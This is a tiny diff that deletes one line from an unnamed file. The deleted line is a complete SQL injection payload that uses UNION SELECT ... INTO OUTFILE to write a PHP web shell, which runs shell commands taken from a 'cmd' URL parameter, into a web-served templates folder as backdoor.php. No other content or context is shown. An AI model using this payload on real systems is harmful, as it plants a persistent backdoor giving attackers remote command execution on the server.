@@ -1,1 +1,0 @@
-UNION SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/templates/backdoor.php';#
